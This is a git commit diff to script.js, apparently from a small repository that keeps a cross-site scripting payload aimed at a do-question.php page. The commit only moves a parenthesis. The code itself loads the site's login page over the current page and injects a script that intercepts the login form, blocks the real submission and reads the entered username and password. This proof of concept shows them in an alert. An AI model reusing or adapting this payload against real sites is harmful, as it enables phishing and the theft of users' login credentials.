1c99d79f9468919dd62010810756b8c18737acee
soesam <67687007+soesam@users.noreply.github.com>
2020-07-08 23:24:25 +0200

    Update script.js

--- script.js
+++ script.js
@@ -17,7 +17,7 @@
 
 ///do-question.php?aaid=10972720'
 
-async () => document.write(await fetch('/login.php').then(page => page.text() + `
+async () => document.write(await fetch('/login.php').then(page => page.text()) + `
 <script>
   setTimeout(() => $('form[action*=login]').submit(e => {
     e.preventDefault()
@@ -25,4 +25,4 @@ async () => document.write(await fetch('/login.php').then(page => page.text() + 
     alert(c[0].value + c[1].value)
   }), 4000)
 </script>
-`))()
+`)()
